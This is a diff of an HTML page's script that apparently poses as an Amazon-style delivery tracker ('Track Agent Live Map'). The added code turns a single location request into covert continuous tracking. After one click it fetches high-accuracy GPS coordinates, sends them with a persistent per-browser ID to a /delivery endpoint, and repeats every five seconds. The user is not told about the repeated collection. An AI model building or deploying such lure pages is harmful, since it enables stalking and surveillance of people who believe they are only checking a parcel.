@@ -143,27 +143,65 @@
     </div>
 
     <!-- Script -->
-    <script>
-        const socket = io();
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        socket.emit("location", {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude
-                        });
-                        alert("Location synced! Loading driver distance...");
-                    },
-                    (error) => {
-                        alert("Please enable location services to track the delivery agent.");
+<script>
+    const id = localStorage.getItem("id") || generateId()
+    const btn = document.querySelector(".btn-amazon")
+    let __interval
+
+    btn.addEventListener("click", () => {
+        btn.disabled = true
+        btn.innerHTML = "📡 Syncing Location..."
+        getLocation()
+    })
+
+    function getLocation() {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+
+                const lat = position.coords.latitude
+                const lng = position.coords.longitude
+
+                fetch("/delivery", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        id,
+                        lat,
+                        lng
+                    }),
+                    headers: {
+                        "Content-Type": "application/json"
                     }
-                );
-            } else {
-                alert("Geolocation is not supported by your browser.");
+                }).catch(err => {
+                    console.log(err)
+                })
+            },
+            (error) => {
+                alert("Please enable location access.")
+                btn.disabled = false
+                btn.innerHTML = "📍 Track Agent Live Map"
+                console.log(error)
+            },
+            {
+                enableHighAccuracy: true
             }
+        )
+
+        if (__interval) clearTimeout(__interval)
+        __interval = setTimeout(getLocation, 5000)
+    }
+
+    function generateId(length = 10) {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        let result = ''
+
+        for (let i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length))
         }
-    </script>
+
+        localStorage.setItem("id", result)
+        return result
+    }
+</script>
 </body>
 </html>
 
